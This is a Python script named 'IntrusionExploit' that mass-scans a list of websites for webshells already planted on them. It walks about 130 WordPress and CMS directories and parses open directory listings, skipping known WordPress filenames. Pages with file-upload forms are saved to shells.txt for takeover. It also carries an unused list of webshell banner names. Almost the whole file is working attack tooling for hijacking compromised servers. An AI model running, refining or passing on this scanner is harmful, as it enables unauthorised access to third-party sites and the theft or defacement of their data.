#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys , requests, re , string , random , hashlib
from multiprocessing.dummy import Pool
from colorama import Fore,Style
from colorama import init
init(autoreset=True)

reset = Style.RESET_ALL
fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA
Paths = ["/wp-content/uploads/","/wp-includes/","/wp-includes/css/","/wp-includes/ID3/","/wp-includes/IXR/","/wp-includes/Requests/","/wp-includes/SimplePie/","/wp-includes/Text/","/wp-content/mu-plugins-old/","/wp-content/themes/classic/inc/","/wp-content/plugins/ninja-forms/","/wp-content/mu-plugins/","/wp-includes/Text/Diff/Renderer/","/wp-includes/blocks/","/wp-includes/certificates/","/wp-includes/customize/","/wp-includes/fonts/","/wp-includes/images/","/.well-known/","/ALFA_DATA/","/.well-knownold/","/.well-known/acme-challenge/","/.well-known/","/cgi-bin/","/ALFA_DATA/","/.well-knownold/","/.well-known/acme-challenge/","/.well-known/","/uploads/","/upload/","/admin/uploads/","/Admin/uploads/","/admin/","/images/","/assets/","/vendor/phpunit/phpunit/src/Util/PHP/","/upload/image/","/assets/images/","/Public/","/vendor/","/local/","/modules/","/Site/","/system/","/template/","/shop/","/files/","/admin/editor/","/include/","/Assets/","/images/stories/","/plugins/","/php/","/wp-includes/assets/","/wp-includes/Text/Diff/Engine/","/wp-includes/block-patterns/","/wp-includes/Text/Diff/","/wp-includes/block-supports/","/wp-includes/blocks/","/wp-includes/certificates/","/wp-includes/SimplePie/Cache/","/wp-includes/SimplePie/Content/Type/","/wp-includes/css/","/wp-includes/SimplePie/Content/","/wp-includes/rest-api/endpoints/","/wp-includes/rest-api/fields/","/wp-includes/Requests/Cookie/","/wp-includes/Requests/Proxy/","/wp-includes/Requests/Response/","/wp-includes/Requests/Transport/","/wp-includes/Requests/Utility/","/wp-includes/js/codemirror/","/wp-includes/Requests/Exception/HTTP/","/wp-includes/js/crop/","/wp-includes/images/crystal/","/wp-includes/images/media/","/wp-includes/images/smilies/","/wp-includes/images/wlw/","/wp-includes/rest-api/search/","/wp-includes/Requests/Exception/","/wp-includes/Requests/Auth/","/wp-includes/sodium_compat/src/","/wp-includes/sitemaps/providers/","/wp-includes/Text/Diff/Engine/Engine/","/wp-includes/customize/","/wp-includes/fonts/","/wp-includes/html-api/","/wp-includes/ID3/","/wp-includes/images/","/wp-includes/IXR/","/wp-includes/js/","/wp-includes/php-compat/","/wp-includes/PHPMailer/","/wp-includes/pomo/","/wp-includes/random_compat/","/wp-includes/Requests/","/wp-includes/rest-api/","/wp-includes/SimplePie/","/wp-includes/sitemaps/","/wp-includes/sodium_compat/","/wp-includes/style-engine/","/wp-includes/Text/","/wp-includes/theme-compat/","/wp-includes/widgets/","/wp-admin/css/colors/ectoplasm/","/wp-admin/css/colors/","/admin/images/slider/","/admin/fckeditor/editor/filemanager/","/sites/default/files/","/admin/controller/extension/extension/","/modules/mod_simplefileuploadv1.3/elements/","/components/","/admin/uploads/images/","/wp-includes/js/","/wp-includes/pomo/","/wp-includes/rest-api/","/wp-includes/widgets/","/wp-admin/css/","/wp-admin/images/","/wp-admin/maint/","/wp-admin/meta/","/wp-admin/network/","/wp-admin/user/","/wp-content/","/wp-content/plugins/","/wp-content/themes/","/wp-admin/includes/","/wp-admin/","/wp-content/upgrade/"]

Signs = ['form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"','form-upload"><input type="submit" value="Upload"','input type="file" name="apx"><input type="submit"','input type="file" name="a"><input name="x" type="submit" value="x"','pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value=','form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"','ABC Manager','-rw-r--r--','<pre align=center><form method=post>Password<br><input type=password name=pass',
'TheAlmightyZeus',"Jijle3",'Tryag File Manager','Gel4y Mini Shell','WSO 5.1.4','aDriv4-Priv8 TOOL','Simple File Manage Design by index.php','Log In | ECWS','Hacked By AnonymousFox','[ HOME SHELL ]','Gecko','Current dir:','Gel4y Mini Shell','MSQ_403','X-Sec Shell V.3','C0d3d By Dr.D3m0','Mr.Combet WebShell','Doc Root:','One Hat Cyber Team','WSO YANZ ENC BYPASS','Yanz Webshell!','WSO 4.2.5','WSO 2.6','Yanz Webshell!','p0wny@shell:~#','WSOX ENC','Bypass 403 Forbidden / 406 Not Acceptable / Imunify360 / Mini Shell','Bypass Sh3ll','FilesMan','MARIJuANA','Graybyt3 Was Here','#wp_config_error#','MSQ_403','Mr.Combet Webshell','Powered By Indonesian Darknet','WSO 4.2.6','b374k','//0x5a455553.github.io/MARIJUANA/icon.png','drwxr-xr-x','PHU Mini Shell','[ Mini Shell ]','Tiny File Manager 2.4.3','#No_Identity','TEAM-0ROOT','WebShellOrb 2.6','#p@@#','WSO 4.2.5','[+] MINI SH3LL BYPASS [+]','CHips L Pro sangad','ineSec Team Shell','MARIJuANA','indoxploit','Vuln!! patch it Now!','Mister Spy','ALFA TEaM Shell - v4.1-Tesla','B Ge Team File Manager','xichang1','Mini Shell By Black_Shadow','Mini Shell','WSO 2.5','WHY MINI SHELL','IndoXploit',"anonymousfox","AnonymousFox","FoxWSO v1.2",'FilesMan']


TrustedFiles = ['admin-filters','admin','ajax-actions','PHPMailer','SMTP','translations','mo','bookmark','getid3.lib','getid3','module.audio-video.asf','module.audio-video.flv','module.audio-video.matroska','module.audio-video.quicktime','module.audio-video.riff','module.audio.ac3','module.audio.dts','module.audio.flac','module.audio.mp3','module.audio.ogg','module.tag.apetag','module.tag.id3v1','module.tag.id3v2','module.tag.lyrics3','script-loader-packages','class-IXR-base64','class-IXR-client','class-IXR-clientmulticall','class-IXR-date','class-IXR-error','class-IXR-introspectionserver','class-IXR-message','class-IXR-request','class-IXR-server','class-IXR-value','heading-paragraph','large-header-button','large-header','quote','text-three-columns-buttons','text-two-columns-with-images','text-two-columns','three-buttons','two-buttons','two-images','align','colors','custom-classname','generated-classname','typography','archives','block','calendar','categories','index','latest-comments','latest-posts','rss','search','shortcode','social-link','tag-cloud','entry','mo','plural-forms','po','streams','translations','Dentry','mo','plural-forms','po','streams','translations','byte_safe_strings','cast_to_int','error_polyfill','random','random_bytes_com_dotnet','random_bytes_dev_urandom','random_bytes_libsodium','random_bytes_libsodium_legacy','random_bytes_mcrypt','random_int','Auth','Cookie','Exception','Hooker','Hooks','IDNAEncoder','IPv6','IRI','Proxy','Response','Session','SSL','Transport','class-wp-rest-request','class-wp-rest-response','class-wp-rest-server','Author','Cache','Caption','Category','Copyright','Core','Credit','Enclosure','Exception','File','gzdecode','IRI','Item','Locator','Misc','Parser','Rating','Registry','Restriction','Sanitize','Source','class-wp-sitemaps-index','class-wp-sitemaps-provider','class-wp-sitemaps-registry','class-wp-sitemaps-renderer','class-wp-sitemaps-stylesheet','class-wp-sitemaps','class-wp-sitemaps-posts','class-wp-sitemaps-taxonomies','class-wp-sitemaps-users','autoload','autoload','inline','Diff','Renderer','native','string','xdiff','comments','embed-404','embed-content','embed','footer-embed','footer','header-embed','header','sidebar','class-wp-nav-menu-widget','class-wp-widget-archives','class-wp-widget-calendar','class-wp-widget-categories','class-wp-widget-custom-html','class-wp-widget-links','class-wp-widget-media-audio','class-wp-widget-media-gallery','class-wp-widget-media-image','class-wp-widget-media-video','class-wp-widget-media','class-wp-widget-meta','class-wp-widget-pages','class-wp-widget-recent-comments','class-wp-widget-recent-posts','class-wp-widget-rss','class-wp-widget-search','class-wp-widget-tag-cloud','class-wp-widget-text','class-automatic-upgrader-skin','class-bulk-plugin-upgrader-skin','class-bulk-theme-upgrader-skin','class-bulk-upgrader-skin','class-core-upgrader','class-custom-background','class-custom-image-header','class-file-upload-upgrader','class-ftp-pure','class-ftp-sockets','class-ftp','class-language-pack-upgrader-skin','class-language-pack-upgrader','class-pclzip','class-plugin-installer-skin','class-plugin-upgrader-skin','class-plugin-upgrader','class-theme-installer-skin','class-theme-upgrader-skin','class-theme-upgrader','class-walker-category-checklist','class-walker-nav-menu-checklist','class-walker-nav-menu-edit','class-wp-ajax-upgrader-skin','class-wp-application-passwords-list-table','class-wp-automatic-updater','class-wp-comments-list-table','class-wp-community-events','class-wp-debug-data','class-wp-filesystem-base','class-wp-filesystem-direct','class-wp-filesystem-ftpext','class-wp-filesystem-ftpsockets','class-wp-filesystem-ssh2','class-wp-importer','class-wp-internal-pointers','class-wp-links-list-table','class-wp-list-table-compat','class-wp-list-table','class-wp-media-list-table','class-wp-ms-sites-list-table','class-wp-ms-themes-list-table','class-wp-ms-users-list-table','class-wp-plugin-install-list-table','class-wp-plugins-list-table','class-wp-post-comments-list-table','class-wp-posts-list-table','class-wp-privacy-data-export-requests-list-table','class-wp-privacy-data-removal-requests-list-table','class-wp-privacy-policy-content','class-wp-privacy-requests-table','class-wp-screen','class-wp-site-health-auto-updates','class-wp-site-health','class-wp-site-icon','class-wp-terms-list-table','class-wp-theme-install-list-table','class-wp-themes-list-table','class-wp-upgrader-skin','class-wp-upgrader-skins','class-wp-upgrader','class-wp-users-list-table','comment','continents-cities','credits','dashboard','deprecated','edit-tag-messages','export','file','image-edit','image','import','list-table','media','menu','meta-boxes','misc','ms-admin-filters','ms-deprecated','ms','nav-menu','network','noop','options','plugin-install','plugin','post','privacy-tools','revision','schema','screen','taxonomy','template','theme-install','theme','translation-install','update-core','update','upgrade','user','widgets','admin-bar', 'atomlib', 'class-wp-application-passwords','repair','class-wp-block-supports','class-wp-terms', 'class-wp-block-supports', 'author-template', 'block-patterns', 'blocks', 'bookmark-template', 'bookmark', 'cache-compat', 'cache', 'canonical', 'capabilities', 'category-template', 'category', 'class-IXR', 'class-feed', 'class-http', 'class-json', 'class-oembed', 'class-phpass', 'class-phpmailer', 'class-pop3', 'class-requests', 'class-simplepie', 'class-smtp', 'class-snoopy', 'class-walker-category-dropdown', 'class-walker-category', 'class-walker-comment', 'class-walker-nav-menu', 'class-walker-page-dropdown', 'class-walker-page', 'class-wp-admin-bar', 'class-wp-ajax-response', 'class-wp-block-list', 'class-wp-block-parser', 'class-wp-block-pattern-categories-registry', 'class-wp-block-patterns-registry', 'class-wp-block-styles-registry', 'class-wp-block-type-registry', 'class-wp-block-type', 'class-wp-block', 'class-wp-comment-query', 'class-wp-comment', 'class-wp-customize-control', 'class-wp-customize-manager', 'class-wp-customize-nav-menus', 'class-wp-customize-panel', 'class-wp-customize-section', 'class-wp-customize-setting', 'class-wp-customize-widgets', 'class-wp-date-query', 'class-wp-dependency', 'class-wp-editor', 'class-wp-embed', 'class-wp-error', 'class-wp-fatal-error-handler', 'class-wp-feed-cache-transient', 'class-wp-feed-cache', 'class-wp-hook', 'class-wp-http-cookie', 'class-wp-http-curl', 'class-wp-http-encoding', 'class-wp-http-ixr-client', 'class-wp-http-proxy', 'class-wp-http-requests-hooks', 'class-wp-http-requests-response', 'class-wp-http-response', 'class-wp-http-streams', 'class-wp-image-editor-gd', 'class-wp-image-editor-imagick', 'class-wp-image-editor', 'class-wp-list-util', 'class-wp-locale-switcher', 'class-wp-locale','wp-tmp' ,'wp-feed','wp-vcd', 'class-wp-matchesmapregex', 'class-wp-meta-query', 'class-wp-metadata-lazyloader', 'class-wp-network-query', 'class-wp-network', 'class-wp-object-cache', 'class-wp-oembed-controller', 'class-wp-oembed', 'class-wp-paused-extensions-storage', 'class-wp-post-type', 'class-wp-post', 'class-wp-query', 'class-wp-recovery-mode-cookie-service', 'class-wp-recovery-mode-email-service', 'class-wp-recovery-mode-key-service', 'class-wp-recovery-mode-link-service', 'class-wp-recovery-mode', 'class-wp-rewrite', 'class-wp-role', 'class-wp-roles', 'class-wp-session-tokens', 'class-wp-simplepie-file', 'class-wp-simplepie-sanitize-kses', 'class-wp-site-query', 'class-wp-site', 'class-wp-tax-query', 'class-wp-taxonomy', 'class-wp-term-query', 'class-wp-term', 'class-wp-text-diff-renderer-inline', 'class-wp-text-diff-renderer-table', 'class-wp-theme', 'class-wp-user-meta-session-tokens', 'class-wp-user-query', 'class-wp-user-request', 'class-wp-user', 'class-wp-walker', 'class-wp-widget-factory', 'class-wp-widget', 'class-wp-xmlrpc-server', 'class-wp', 'class.wp-dependencies', 'class.wp-scripts', 'class.wp-styles', 'comment-template', 'comment', 'compat', 'cron', 'date', 'default-constants', 'default-filters', 'default-widgets', 'deprecated', 'embed-template', 'embed', 'error-protection', 'feed-atom-comments', 'feed-atom', 'feed-rdf', 'feed-rss', 'feed-rss2-comments', 'feed-rss2', 'feed', 'formatting', 'functions', 'functions.wp-scripts', 'functions.wp-styles', 'general-template', 'http', 'kses', 'l10n', 'link-template', 'load', 'locale', 'media-template', 'media', 'meta', 'ms-blogs', 'ms-default-constants', 'ms-default-filters', 'ms-deprecated', 'ms-files', 'ms-functions', 'ms-load', 'ms-network', 'ms-settings', 'ms-site', 'nav-menu-template', 'nav-menu', 'option', 'pluggable-deprecated', 'pluggable', 'plugin', 'post-formats', 'post-template', 'post-thumbnail-template', 'post', 'query', 'registration-functions', 'registration', 'rest-api', 'revision', 'rewrite', 'rss-functions', 'rss', 'script-loader', 'session', 'shortcodes', 'sitemaps', 'spl-autoload-compat', 'taxonomy', 'template-loader', 'template', 'theme', 'update', 'user', 'vars', 'version', 'widgets', 'wp-db', 'wp-diff', 'https-detection', 'https-migration', 'robots-template']
print("""
 ___       _                  _             _____            _       _ _   
|_ _|_ __ | |_ _ __ _   _ ___(_) ___  _ __ | ____|_  ___ __ | | ___ (_) |_ 
 | || '_ \| __| '__| | | / __| |/ _ \| '_ \|  _| \ \/ / '_ \| |/ _ \| | __|
 | || | | | |_| |  | |_| \__ \ | (_) | | | | |___ >  <| |_) | | (_) | | |_ 
|___|_| |_|\__|_|   \__,_|___/_|\___/|_| |_|_____/_/\_\ .__/|_|\___/|_|\__|
                                                      |_|                  
""")
requests.urllib3.disable_warnings()
headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}
try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site
def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))
def Exploit(domain,Path,i):
        try:
            exploit_point = "http://"+domain + Path
            checkShell = requests.get(exploit_point, verify=False,headers=headers,timeout=20).content
            checkShell = checkShell.lower()
            if ('type="file"' in checkShell or 'type=file' in checkShell) and 'multipart/form-data' in checkShell and ('method="post"' in checkShell or 'method=post' in checkShell) and '<input' in checkShell:
                print (' -| ' + exploit_point +' {}['+str(i)+'/'+str(len(Paths))+']'+ ' --> {}[Succefully]').format(fc,fg)
                open('shells.txt', 'a').write(exploit_point +'\n')
                return True
            else:
                exploit_point = "https://"+domain + Path
                checkShell = requests.get(exploit_point, verify=False,headers=headers,timeout=20).content
                checkShell = checkShell.lower()
                if ('type="file"' in checkShell or 'type=file' in checkShell) and 'multipart/form-data' in checkShell and ('method="post"' in checkShell or 'method=post' in checkShell) and '<input' in checkShell:
                    print (' -| ' + domain +' {}['+i+'/'+len(Paths)+']'+ ' --> {}[Succefully]').format(fc,fg)
                    open('shells.txt', 'a').write(exploit_point +'\n')
                    return True
                else:
                    print (' -| ' +exploit_point +' {}['+str(i)+'/'+str(len(Paths))+']'+ '{}  --> {}[Failed]').format(fc,reset,fr)
                    return False
        except  Exception as e:
            print (' -| ' +"https://"+ domain +' {}['+str(i)+'/'+str(len(Paths))+']'+ ' --> {}[Failed]').format(fc,fr)
            return False

def ExtractFiles(domain,Path,PageSource,i):
    try:
        regex = 'php">(.*).php</a>'
        urlPath = 'http://'+domain+Path
        files = re.findall(regex, PageSource)
        for element in TrustedFiles:
            if element in files:
                files.remove(element)
        if len(files) == 0:
            print (' -| ' +urlPath +' {}['+str(i)+'/'+str(len(Paths))+']'+ '{}  --> {}[Failed]').format(fc,reset,fr)
            return False
        if len(files) < 15:
			j = 0 # Consistent use of spaces
			FoundedShell= False
			while j<len(files) and not FoundedShell:
				if Exploit(domain,Path+files[j].replace(' ','')+'.php',i):
					FoundedShell = True
					return True
				j= j+1
        else:
            print (' -| ' +urlPath +' {}['+str(i)+'/'+str(len(Paths))+']'+ '{}  --> {}[Failed]').format(fc,reset,fr)
            return False
    except:
        print ' -| ' + domain + ' --> {}[Failed]'.format(fr)
        return False
def  ExploreIndexOf(domain,Path,i):
    try:
        urlPath = 'http://'+domain+Path
        IndexOfPage = requests.get(urlPath,headers=headers , timeout=15 , allow_redirects=True).content
        if 'Index of' in IndexOfPage:
			return ExtractFiles(domain,Path,IndexOfPage,i)
        else:
            print (' -| ' +urlPath +' {}['+str(i)+'/'+str(len(Paths))+']'+ '{}  --> {}[Failed]').format(fc,reset,fr)
            return False
    except :
        print (' -| ' +"http://"+ domain +' {}['+str(i)+'/'+str(len(Paths))+']'+ ' --> {}[Failed]').format(fc,fr)
        return False
def main(url):
	try:
		i = 0
		shellExist = False
		url = URLdomain(url)
		while i < len(Paths)  and not shellExist:
			MyPath = Paths[i]
			if not MyPath.startswith('/'):
				MyPath = '/'+MyPath
			if '.php' in Paths[i] :
				if Exploit(url,MyPath,i):
					shellExist = True
			else:
				if not MyPath.endswith('/'):
					MyPath = MyPath + '/'
				if ExploreIndexOf(url,MyPath,i):
					shellExist = True
			i = i+1
	except Exception as e:
		print ' -| ' + url + ' --> {}[Failed]'.format(fr)

mp = Pool(100)
mp.map(main, target)
mp.close()
mp.join()

print '\n [!] {}Saved in shells.txt'.format(fc)
